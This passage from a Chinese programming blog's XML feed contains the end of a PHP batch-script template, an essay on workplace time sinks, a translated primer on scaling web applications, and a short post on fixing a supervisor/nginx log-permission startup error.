class="keyword">try</span> &#123;</span><br><span class="line">        $timeStart = microtime(<span class="keyword">true</span>);</span><br><span class="line">        $startDesc = date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">' 开始执行！'</span> . PHP_EOL;</span><br><span class="line">        $logFile = <span class="keyword">__DIR__</span> . <span class="string">'/refactor_data.log'</span>;</span><br><span class="line">        <span class="keyword">echo</span> $startDesc;</span><br><span class="line">        </span><br><span class="line">        file_put_contents($logFile, $startDesc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//数据初始化</span></span><br><span class="line">        $updateData = [];</span><br><span class="line">        $success = $failed = $exception = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $datum) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                $failed++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                file_put_contents(logFile, $datum[<span class="string">'id'</span>] . <span class="string">'由于xxx执行失败'</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span>) &#123;</span><br><span class="line">                $exception++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                file_put_contents(logFile, $datum[<span class="string">'id'</span>] . <span class="string">'由于xxx无法执行'</span> . PHP_EOL, FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理脚本...</span></span><br><span class="line">            file_put_contents($logFile, $datum[<span class="string">'id'</span>] . PHP_EOL, FILE_APPEND);</span><br><span class="line">            $success++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $timeStop = microtime(<span class="keyword">true</span>);</span><br><span class="line">        $endDesc = date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'执行结束！'</span> . PHP_EOL;</span><br><span class="line">        file_put_contents($logFile, $endDesc, FILE_APPEND);</span><br><span class="line">        <span class="keyword">echo</span> $endDesc;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 格式化执行耗时</span></span><br><span class="line">        $seconds = round($timeStop - $timeStart, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">switch</span> ($seconds) &#123;</span><br><span class="line">            <span class="keyword">case</span> $seconds &gt; <span class="number">60</span> &amp;&amp; $seconds &lt; <span class="number">3600</span>:</span><br><span class="line">                $elapsed = intval($seconds / <span class="number">60</span>) . <span class="string">'m'</span> . ($seconds % <span class="number">60</span>) . <span class="string">'s'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> $seconds &gt; <span class="number">3600</span> &amp;&amp; $seconds &lt; <span class="number">86400</span>:</span><br><span class="line">                $elapsed = intval($seconds / <span class="number">3600</span>) . <span class="string">'h'</span> . intval($seconds % <span class="number">3600</span> / <span class="number">60</span>) . <span class="string">'m'</span> . ($seconds % <span class="number">60</span>) . <span class="string">'s'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                $elapsed = $seconds . <span class="string">'s'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 格式化内存单位</span></span><br><span class="line">        $formatStorageUnit = <span class="function"><span class="keyword">function</span> <span class="params">($scale)</span> </span>&#123;</span><br><span class="line">            $gb = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">            $mb = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">            $kb = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">switch</span> ($scale) &#123;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $gb:</span><br><span class="line">                    $humanUnit = round($scale / $gb, <span class="number">2</span>) . <span class="string">'GB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $mb:</span><br><span class="line">                    $humanUnit = round($scale / $mb, <span class="number">2</span>) . <span class="string">'MB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> $scale &gt;= $kb:</span><br><span class="line">                    $humanUnit = round($scale / $kb, <span class="number">2</span>) . <span class="string">'KB'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $humanUnit = $scale . <span class="string">'B'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $humanUnit;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $total = <span class="number">999</span>;</span><br><span class="line">        $summary = <span class="string">'=============统计摘要信息================'</span> . PHP_EOL .</span><br><span class="line">            <span class="string">'本次共需处理'</span> . $total . <span class="string">'条数据，成功'</span> . $success . <span class="string">'条，失败'</span> . $failed . <span class="string">'条，无法处理'</span> .</span><br><span class="line">            $exception . <span class="string">'条。'</span> . PHP_EOL . <span class="string">'执行耗时'</span> . $elapsed . <span class="string">', 内存消耗'</span> . $formatStorageUnit(memory_get_usage()) .</span><br><span class="line">            <span class="string">'，内存消耗峰值'</span> . $formatStorageUnit(memory_get_peak_usage()) . PHP_EOL;</span><br><span class="line"></span><br><span class="line">        file_put_contents($logFile, $summary, FILE_APPEND);</span><br><span class="line">        <span class="keyword">echo</span> $summary;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 邮件通知执行结果</span></span><br><span class="line">        (<span class="keyword">new</span> Mail())-&gt;sendMail([</span><br><span class="line">            <span class="string">'title'</span>    =&gt; <span class="string">'xxx脚本执行完成'</span>,</span><br><span class="line">            <span class="string">'body'</span>     =&gt; $summary,</span><br><span class="line">            <span class="string">'receiver'</span> =&gt; <span class="string">'mail@example.com'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="comment">// 邮件通知执行结果</span></span><br><span class="line">        (<span class="keyword">new</span> Mail())-&gt;sendMail([</span><br><span class="line">            <span class="string">'title'</span>    =&gt; <span class="string">'xxx脚本执行失败'</span>,</span><br><span class="line">            <span class="string">'body'</span>     =&gt; <span class="string">'执行失败，错误原因：'</span> . $e-&gt;getMessage(),</span><br><span class="line">            <span class="string">'receiver'</span> =&gt; <span class="string">'mail@example.com'</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前就是这些了，再有新的经验随时补充:)</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间黑洞</title>
      <link href="/post/time-blackhole/"/>
      <url>/post/time-blackhole/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87b8wwj7yj30q40b8myo.jpg" alt=""></p><a id="more"></a><p>为什么你总在加班？为什么你下班后身心俱疲，但又感觉一天没做什么？你的时间都去哪儿了？如何才能早点下班回家？今天，我们来探讨一下这个如今非常普遍现象背后的原因。</p><h1 id="办公环境"><a href="#办公环境" class="headerlink" title="办公环境"></a>办公环境</h1><p>不知道你有没有这样的经历：你的旁边是电话销售或者售后服务，当你准备将构思好的一段代码写下来时，他们的一通电话让你的构思像被一阵龙卷风袭击一样，再也想不起来。你感觉自己就像置身于菜市场一样，根本无法写出什么像样的代码。</p><p>现在开放式办公越来越受欢迎，看起来似乎让同事间的沟通更加的高效、同事的关系也更加融洽，但事实却是你经常被旁边同事与他人的讨论打扰，忍受着视觉与听觉的污染，让你无法集中注意力。原本半小时就可以完成的任务，你需要经常停下来重新捋一下思路，你花费了更长的时间来完成任务，质量还打了折扣。</p><p>开放式办公与格子间办公各有利弊，前者更便于沟通，让员工无法在上班时间娱乐；后者给员工一个相对独立的空间，能更加专注高效处理事件。二者似乎难以抉择，正如没有最好的方式，只有合适的方式一样，可以为员工提供两种办公环境，让员工自由选择。如果采用开放式办公只是为了防止员工上班“摸鱼”，你或许应该改善的是招聘标准，而不是让工作效率降低的工作环境。</p><h1 id="会议"><a href="#会议" class="headerlink" title="会议"></a>会议</h1><p>你可能也有过这样的经历：被邀请参加一个会议，进去之后发现很多的参会者，认真听了一会儿后，发现似乎和你没有什么关系。当你正想看一下之前收藏的博客时，又突然被提问。眼看会议室时间就要到了，组织者似乎对本场会议不是很满意，又约定两天后继续讨论。</p><p>毫无疑问，会议是一种高成本的高效沟通方式，但很多人将这种沟通方式滥用，反而浪费了很多的时间。因此，这种形式需要组织者在会前认真做很多准备工作，如：明确会议主题、必要与会人员、参会者会议前需要了解的内容、会议所要达到的效果等。</p><h1 id="需求评估"><a href="#需求评估" class="headerlink" title="需求评估"></a>需求评估</h1><p>产品需求的合理性，需求与系统间的平衡，投入产出比等，这是我们每个开发者在需求评估时都需要考虑的问题。产品经理与开发者应该站在各自的角度评估需求，并给出合理的解释。对于那些收益较少，但会对系统稳定及维护造成很大冲击的需求，请严辞拒绝，如果产品经理用领导向你施压，而领导又无法给出令人信服的理由，你或许应该考虑换一个团队了。</p><p><strong>一个畸形的需求会像核辐射一样污染整个项目</strong>。到时你不得不每天充当救火队员，即使在下班时间也会常常收到报警提醒。</p><p>如果你评估后认为需求合理，但产品要求你3天完成一个不可能完成的任务，请不要高估自己的能力，说明你的真实情况。要么延长开发时间，要么增加人手。说明自己在不可能的时间完成任务并不丢人，承诺失信才更加丢人。</p><h1 id="拼凑代码"><a href="#拼凑代码" class="headerlink" title="拼凑代码"></a>拼凑代码</h1><p>你编程的方式是不是在不停的试验，寻找一种看上去能工作的组合？即使你这样随意的开发过程能够产生出一个正确的程序，但你真的清楚你写的代码是如何运行的吗？清楚其中所隐藏的 bug 吗？你需要真正理解你的代码是如何工作的，而不是瞎猜。</p><p>相比与拼凑代码的程序员，优秀程序员会首先理解需求，然后在脑海中模拟程序的执行，再将执行过程用伪代码的方式记录下来，检索逻辑是否存在漏洞，是否有值得优化的地方。当他们确定好之后，再转换为代码语言。在这个过程中，他们用80%的时间思考，用20%的时间写出高质量的代码，而他们大多数时间看起来并不是那么忙。他们用伪代码来检查自己的整个代码，也确保自己在编写代码过程中不会走偏而浪费时间。</p><p>在编写完成后，差的程序员自己跑一遍代码就提交给测试，而优秀的程序员会重新审视自己刚写的代码，这个过程中又能发现80%的错误，诸如拼写错误，判断边界条件等。不经审视的代码在测试后收到一大堆的问题反馈，如需求不符，数据显示错误等显而易见的问题，在来回反馈问题、处理问题的沟通中，时间又在不知不觉间来到了下班时间，但现在的问题还很多，意味着你今晚要加班解决了。</p><p>在这个过程中，我们发现好的开发过程并不会提升你的工作时间和工作量，反而会让你更早下班，安心休息。</p><ul><li>认真评估与理解需求</li><li>用伪代码检查可行性与常见问题</li><li>将伪代码转换为编程语言</li><li>审视自己的代码，你通常能找到80%的错误，从而节省大量时间</li></ul><h1 id="调试-bug"><a href="#调试-bug" class="headerlink" title="调试 bug"></a>调试 bug</h1><p>你可能在工作中经常会听到这样的话：</p><ul><li>这问题不可能是我的，我什么也没改</li><li>昨天还好好的，怎么今天突然就不行了呢？</li><li>我本地跑的好好的，为什么一到线上就不行了？</li></ul><p>要知道，如果你写的程序出了问题，那就是你的原因，不是计算机的，也不是编译器的。程序不会每次都产生不同的结果。它不是自己写出来的，是你写的，所以，请对它负责。</p><p>我们可能还会在工作中遇到这样的一种人：</p><ul><li>查找bug时不停的在程序中散布<code>print</code>，如果<code>print</code>没有找到原因，那就随便修改点什么，让程序看起来好像正常了</li><li>出现的问题不值一提，要解决它们并不需要彻底弄懂程序。只要能让程序看起来正常运行就行了</li><li>不需要重写这段自己两个月前的烂代码，只要能让这段程序跑起来就行</li></ul><p>在大多数情况下，查找并理解 bug 通常占用了整个调试工作的 90%。因此，如果你已经在查找 bug 中花费了太多的时间，你或许应该优化你的异常处理，能够快速定位到问题所在；也应该优化你的代码，不要让那些难以阅读的代码花费太多时间。治标不治本的问题处理方式同样会让你和这个问题纠缠在一起，浪费更多的时间，</p><h1 id="质量"><a href="#质量" class="headerlink" title="质量"></a>质量</h1><p>不让苍蝇烦扰你的最好方式就是消灭苍蝇，因此，我们需要高质量来减少我们在 bug 中所花费的大量时间。而质量保障在项目中又是一个设计面很广泛的话题，更详细的内容可阅读《代码大全》等经典书籍，也可以查看我的<a href="http://blog.palemoky.top/2019/09/28/%E3%80%90%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E3%80%91%E3%80%8A%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8%E3%80%8B/">《代码大全》笔记</a>。</p><p>软件质量大体包括以下方面：</p><ul><li>需求调研</li><li>产品设计</li><li>技术架构(是否包含取悦老板的部分？)</li><li>项目实施人员配置(《人月神话》)</li><li>数据表设计</li><li>开发规范<ul><li>高质量的类</li><li>高质量的子程序</li><li>防范式编程</li></ul></li><li>质量保障是否全程关注</li><li>自动化测试</li><li>bug 追踪</li><li>bug 分析统计</li></ul><p>经验告诉我们：错误越早引入软件当中，问题就会越复杂，修正这个错误的代价也就越高，因为错误会牵涉到系统的更多部分。因此，保障开发质量并不会让你做很多工作，而会让你节省很多时间。那些为了追求速度而放弃质量的决策者是愚蠢的。提高质量不仅能缩短开发周期、降低开发成本，也让工作与生活的平衡成为可能。</p><h1 id="远离老好人领导"><a href="#远离老好人领导" class="headerlink" title="远离老好人领导"></a>远离老好人领导</h1><p>这样的领导大包大揽一大堆，不清楚职责边界。看似做了很多工作，但又有很多问题。这不会给你增加成就感，反而徒增挫败感：每天的问题如洪水猛兽吞噬着每个人的时间，你和他反馈现状，他只会让你放弃你的想法；你和他讨论问题的解决方案，他的方案是权宜之计。请远离这样的领导，他只会不停吞噬你宝贵的时间。</p><hr><p>那些经常哭诉自己每天从早干到晚的人不值得同情，抱怨解决不了任何问题，只会浪费更多的时间。</p><p>最后，我想引用一段知乎用户在相似问题下的<a href="https://www.zhihu.com/question/342244497/answer/815161940" target="_blank" rel="noopener">回答</a>：</p><blockquote><p>为什么几十年前，很多思想家都幻想过。<br>随着科技发展，人们每天只需要工作3-5小时。<br>人们可以享受生活，享受自由，享受家庭，享受大自然。</p><p>为什么科技越发展，人们越没法享受科技发展的红利？<br>人们不仅没法每天工作3-5小时，996还成了福报，35岁被裁员成了标配。<br>为什么科技越发展，劳动者越痛苦，劳动时间越长。<br>为什么现在的绝大部分劳动者，都养不活两个孩子？</p><p>科技真的进步了吗？社会真的发展了吗？<br>如果科技进步了，社会发展了，文化繁荣了。<br>那么是什么夺走了人们的生活，时间，孩子？</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软件编程，随笔杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【译】通俗讲解网站扩展</title>
      <link href="/post/website-extension/"/>
      <url>/post/website-extension/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1drnb6tzij30jg0bf0tz.jpg" alt=""></p><a id="more"></a><h1 id="【译】通俗讲解网站扩展"><a href="#【译】通俗讲解网站扩展" class="headerlink" title="【译】通俗讲解网站扩展"></a>【译】通俗讲解网站扩展</h1><blockquote><p><em>译者注：本文译自 Arcentry 文章《Scaling webapps for newbs &amp; non-techies》，点击<a href="https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/" target="_blank" rel="noopener">此处</a>查看原文</em></p></blockquote><p>本文简要的介绍了网站如何从一台服务器到承受数百万用户的架构部署演化，主要为新入门开发者和非从业人员而写。</p><h2 id="网站扩展"><a href="#网站扩展" class="headerlink" title="网站扩展"></a>网站扩展</h2><p>现在，假设你刚刚完成了你的网站，在线商店、社交 APP 或者别的什么，当项目上线时，感觉一切都好极了：每天有几百个用户访问你的网站，网站快速做出请求响应，一切都在有条不紊地进行着。</p><p>但是之后一件可怕的事情出现了：你的网站一夜爆红！</p><p>越来越多的用户开始涌向你的网站，每小时、每分钟、每秒钟成千上万的用户发来请求……这对老板来说，真是一个天大的好消息，但对基础运维来说，简直就是一场噩梦，因为现在，你需要做网站的扩展来承受洪水般的流量。这意味着你需要：</p><ul><li>同时处理更多的请求</li><li>除了光纤被挖断，服务的高可用</li><li>服务来自世界各地的用户</li></ul><h2 id="如何扩展"><a href="#如何扩展" class="headerlink" title="如何扩展"></a>如何扩展</h2><p>几年前，这样的问题会从水平扩展与垂直扩展的角度开始讨论。垂直扩展是指通过提升单机的处理能力来处理更多的请求，而水平扩展则是通过复制当前架构模型来提升处理能力。</p><p>今天，几乎没有人再使用垂直扩展，原因很简单：</p><ul><li>计算机的价格越来越昂贵，而性能提升却微乎其微</li><li>单台服务器的性能存在天花板</li><li>多核CPU也就是多个单核CPU的并行处理效率，那为什么不进行水平扩展呢？<br>OK，我们选用水平扩展来提升网站，但又需要怎么做呢？</li></ul><h3 id="1-单一服务器"><a href="#1-单一服务器" class="headerlink" title="1. 单一服务器"></a>1. 单一服务器</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dnqtex5gj30jg0bumxv.jpg" alt=""></p><p>这可能是你最初的架构。一台服务器既运行着业务，又存储着数据，简单又实用，但为了满足更高的要求，这种架构只能运行在性能更强的服务器上，这不是我们所希望的。</p><h3 id="2-增加反向代理"><a href="#2-增加反向代理" class="headerlink" title="2. 增加反向代理"></a>2. 增加反向代理</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dnxk7if8j30jg0alwf6.jpg" alt=""></p><p>为了应付大流量，你第一步需要做的是增加反向代理。就像是酒店的前台，你可以让客人直接到他的客房，但事实上，你需要一位大堂经理，判断客人是否可以进入，是否已经提前预定好客房，如果客房已满，你应该友好地告知客人，而不是让客人自己挨个去查看。这个例子很好的解释了反向代理，反向代理通常只是接收与转发请求，然后这些请求在处理完成后从我们的服务器返回给用户。当用户向服务器发起请求时，这些请求需要路由到我们的服务器上，所以我们称之为“反向代理”。</p><p>反向代理的作用如下：</p><ul><li>可用性检查。确保我们的服务正常运行</li><li>路由。转发请求到正确的处理终端</li><li>鉴权。确保用户有权限访问服务</li><li>防火墙。确保仅被授权的用户可以访问</li></ul><h3 id="3-负载均衡"><a href="#3-负载均衡" class="headerlink" title="3. 负载均衡"></a>3. 负载均衡</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1doii7p2zj30jg0csgmn.jpg" alt=""></p><p>大多数的反向代理服务器还有一个作用：负载均衡。负载均衡是一个较为简单的概念：想象一下，有100个用户准备在限定的时间内进行支付，不幸的是，你的支付服务只能同时处理50笔交易，该怎么解决呢？你只需要同时运行两台支付服务就可以了。</p><p>负载均衡服务器现在需要将支付请求分流到两台服务器上，用户A的支付在S1上处理，用户B的支付在S2上处理，用户C的支付在S3上处理……</p><p>如果同时有500个用户发起支付请求该怎么办呢？没错！你只需将支付服务器扩展到10台来分发处理这些请求即可。</p><h3 id="4-增强数据库"><a href="#4-增强数据库" class="headerlink" title="4. 增强数据库"></a>4. 增强数据库</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1doshmdyij30jg0bwwfh.jpg" alt=""></p><p>负载均衡可以将用户的请求在多台服务器进行处理，但你注意到其中的问题了吗？我们可以扩展几十台、几百台甚至几千台服务器来处理请求，但所有的数据都储存在了同一个数据库中。</p><p>所以，我们可以用同样的办法来扩展数据库吗？答案是 No！这里涉及到了数据一致性的问题。我们需要保证系统所使用的数据是一致的，不一致的数据会导致一系列的问题，比如：同一个订单被多次处理，我们从一个100元的账户进行了两次扣款操作……那我们又该如何调整数据库来确保数据的一致性呢？</p><p>首先我们要做的就是将数据库功能拆分，一部分只负责接收与存储数据，其他部分只进行数据的检索。这种解决方案被称为主从复制或者读写分离。假设数据被读取的频率高于写入频率，我们可以将数据一处写入，多处读取（被读取的数据是写入数据的副本）。这里的缺点是我们只能在一处写入数据，这对于中小型网站来说没有问题，但不适用 Facebook 这样的网站，我们将在第9章进一步讨论如何扩展这样级别的数据库。</p><h3 id="5-微服务"><a href="#5-微服务" class="headerlink" title="5. 微服务"></a>5. 微服务</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dpdetz6uj30jg0c3wfw.jpg" alt="Microservices"></p><p>到现在为止，我们还是用一台服务器来处理所有的事情：处理支付、订单、库存查询、网站运行、管理账户等。</p><p>这或许不是件坏事——单一服务器意味着更低的复杂度、也更利于开发人员。但随着服务器的扩展，事情开始变得复杂与低效：</p><ul><li>不同服务器处理相同的事情——对每个登陆的用户而言，可能有几百个页面需要处理，但这些都是由同一个服务器完成的。</li><li>开发团队随着业务扩张——随着越来越多的开发者在同一台服务器上工作，冲突也越来越多</li><li>单一服务器意味着当我们想要完成新版本的迭代时，必须完成所有的工作。当一个团队想要快速发布更新时，由于依赖的另一个团队只完成了一半，导致了危险的相互依赖性。</li></ul><p>微服务的出现很好的解决了这些问题。微服务的概念很简单——将你的服务以功能单元进行拆分，并进行独立部署。微服务具有以下优点：</p><ul><li>每个服务能都被独立扩展，让我们能更加灵活地调整以适应业务发展（<em>译者注：比如邀请注册的网站限时开放注册，此时有大量的注册请求，我们可以扩展注册账户服务器的处理能力；当双十一进行大量支付处理时，我们可以扩展支付系统的处理能力，活动结束后，再将处理能力进行恢复，此为弹性扩容</em>）</li><li>运维团队能够独立处理各功能单元，他们能负责微服务的整个生命周期（创建、部署、升级等）</li><li>每个微服务可以使用所需资源。如第4章那样，需要数据库的扩展</li></ul><h3 id="6-缓存与CDN"><a href="#6-缓存与CDN" class="headerlink" title="6. 缓存与CDN"></a>6. 缓存与CDN</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dq9od5rcj30jg0c8abp.jpg" alt=""></p><p>有什么比工作更高效的方法吗？（What’s better than working more efficiently?）答案是什么都不做！我们所使用的网站或APP由大量的静态资源所组成，如图片、JavaScript 和 CSS 文件，某些产品的预渲染登陆页等。相对于在每次请求时重新计算或者重新生成这些资源，我们使用“缓存”来加速响应并节约服务器资源——缓存记录最新的结果，并直接返回给再次请求的用户。</p><p>大型的缓存服务被称为CDN（Content Delivery Network，内容分发网络）——大量的缓存内容被存放在世界各地。CDN能让用户就近快速获取到所需资源，而不需要每次跨越千山万水到中央服务器获取。</p><h3 id="7-消息队列"><a href="#7-消息队列" class="headerlink" title="7. 消息队列"></a>7. 消息队列</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1dqm3ll8uj30jg0bdjsz.jpg" alt="Message Queues"></p><p>你去过游乐场吗？是不是经常需要排队购票呢？地铁闸机口、银行柜台、游乐场售票处都是解释“子容量并行性”（sub-capacity parallelism）概念非常好的例子。没错，他们都是并行处理的：多个售票窗口同时售票，但他们又无法同时为每个人服务，因此，在每个窗口后开了排队。</p><p>同样的，在大型网站中。每分钟有成百上千的图片上传到 Instagram、Facebook，每张图片都需要被处理、裁剪、分析与打标签（<em>译者注：如反恐扫黄系统</em>），这是非常耗时的。所以，与其让用户等待图片上传完成及所有的处理过程，不如服务器在接收到图片后再做以下三件事：</p><ul><li>存储原始图片，不做任何处理</li><li>向用户返回图片上传成功</li><li>对待处理图片增加标识，指定待处理部分</li></ul><p>其他服务通过检索待处理标识来逐一处理，直到完成所有待处理任务。管理这样任务的系统被称为“消息队列”。使用消息队列有很多好处：</p><ul><li>将任务与处理异步化。有时许多图片需要被处理，有时只有几张；有时有很多CPU资源可用，有时却只有部分CPU资源可用。通过将待处理任务堆积，而不是直接处理，我们可以确保我们的系统可用性，而且任务不会丢失。</li><li>缓冲请求，扩展处理资源。当有大量用户上传图片时，我们需要时间来调拨更多的处理资源，如果没有消息队列，可能直接导致宕机。相反，有消息队列系统时，我们可以将请求添加到任务队列中，在处理资源到位后再进行处理，保证网站的可用性。</li></ul><blockquote><p>好了，现在我们的网站可以承受相当大的流量请求了，但如果我们想要承受更大的流量该怎么做？好吧，我们还需要做以下的一些工作：</p></blockquote><h3 id="8-分片"><a href="#8-分片" class="headerlink" title="8. 分片"></a>8. 分片</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1drnb6tzij30jg0bf0tz.jpg" alt=""></p><p>什么是分片呢？“分片是一种通过将服务拆分为多个单元来并行处理的一种技术，每个单元只负责某些部分”（”Sharding is a technique of parallelizing an application’s stacks by separating them into multiple units, each responsible for a certain key or namespace”）</p><p>所以，到底什么是分片呢？分片其实是一个非常简单的概念：想要像 Facebook 那样服务20亿用户？将你的架构改造成类似于26个 mini 版的 Facebook，每个用户通过不同的英语字母表来区分。Aaron Abrahams？应该被A服务器处理；Zacharias Zuckerberg? 应该被Z服务器处理……</p><p>分片不仅仅基于字母，也可以基于数字或者其他规则，如位置、使用频率等。你可以分片你的服务器、数据库或者其他服务资源，这完全取决于你的业务需要。</p><blockquote><p><em>译者注：分片技术，简而言之，就是将功能模块进行打包复制，类似于第3章的方案，提高并行处理能力。</em></p></blockquote><h3 id="9-DNS"><a href="#9-DNS" class="headerlink" title="9. DNS"></a>9. DNS</h3><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1dsbsehduj30jg0bfmyg.jpg" alt=""></p><p>到目前为止，你部署了单一的负载均衡服务器——即使你花费高昂的价格购买了性能更强劲的服务器，由于硬件的物理限制，仍然难以满足大量的请求。幸运的是，在世界范围内，分布着一个在流量到达我们服务器前非常稳定的负载均衡工具——DNS(Domain Name System，域名系统)。该系统能将域名”arcentry.com”映射到具体的网络地址（IP），如143.204.47.77，该系统也允许我们为同一个域名指定多个不同的IP，从而在不同的机器上处理相同请求。</p><blockquote><p>非常感谢你能耐心看到这里，我希望这篇文章能对你有些用处。但是，如果你是IT从业人员，或许你在读了这篇文章后，又想到了一个困扰你很久的问题：什么是云服务？</p></blockquote><h1 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h1><p>云服务又是什么呢？已经2018年了，解决上述许多问题的最便宜和最有效的办法很明显：不用亲自解决！相反，由你的云服务提供商来为你扩展系统，而无需亲自处理这些问题，你只需关注自身业务。（<em>译者注：据统计显示，目前中国有40%的网站在阿里云托管，最近的阿里云事故导致大量的企业受损，这对一些小型企业来说，是灭顶之灾，因此如果自身有能力，还是要掌控局面，毕竟数据无价，如果必须选择云服务商，在选择靠谱的服务商外，不要把鸡蛋放在一个篮子里</em>）</p><p>以我的网站为例，我不需要做以上扩展的任何事情（除了数据的读写分离），只需要将网站托管在AWS上，没有服务器，没有烦恼。</p><p>但云服务也不是银弹，它也有自身一些问题与权衡。请继续关注本系列的下篇文章，以了解有关“面向新手与非技术人员云服务”的更多信息。</p><hr><blockquote><p>个人总结：应对大规模流量的处理层级为：DNS ==&gt; CDN缓存 ==&gt; 负载均衡服务器 ==&gt; 消息队列 ==&gt; 容器集群 ==&gt; 分片 ==&gt; 数据库读写分离</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>supervisor启动服务失败</title>
      <link href="/post/supervisor-start-error/"/>
      <url>/post/supervisor-start-error/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cmpr0nrcj30qo0c8q3c.jpg" alt=""></p><a id="more"></a><p>起因<br>最近一个多月 MBP 每天下午不定时突然重启，所幸每次重启后的不受影响，正好项目也比较紧张，也就忍忍先赶项目了，期间联系了 Apple 在线客服，但总是让我升级系统重试，上周正好项目上线了，赶紧抓紧时间预约了周五下午的天才吧，到了之后告诉我由于过保，检测费用300元，需要48小时的检测时间，同时需要告知售后开机密码。我一听就不干了，周一能不能干活先不说，把密码告诉你，那我银行卡的两块五没了怎么办？！</p><p>由于这个问题是最近出现的，因此我判断不是硬件的问题，只要是软件的问题就好说，直接拿出大招——重装系统。虽说格盘前已经尽可能的备份了自己能想到的所有文件，但总是会有些遗漏的地方，比如 docker 镜像</p><p>正文<br>重新安装完系统后，从同事那里拷贝过来了 docker 镜像，但启动容器后无法正常发起请求，进入容器使用命令<code>supervisorctl status</code>看到 nginx 没有启动，遂使用命令<code>supervisorctl start nginx</code>启动 nginx，但提示 <code>supervisor ERROR (spawn error)</code>，虽然有错误提示，但这样的提示对我来说就是没有提示，然后使用命令<code>supervisorctl tail nginx stdout</code>进一步查看信息，终于发现是由于相关的日志文件没有权限导致 nginx 服务无法正常启动，通过对比 MySQL 服务发现，nginx 服务用 work 账户执行，但日志文件的所有者和所属组却是 root，难怪会没有权限，于是使用<code>chown</code>和<code>chgrp</code>命令将日志文件的所有者与所属组更正，再次执行<code>supervisorctl start nginx</code>后，nginx 正常启动了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件推荐</title>
      <link href="/post/software-recommand/"/>
      <url>/post/software-recommand/</url>
      
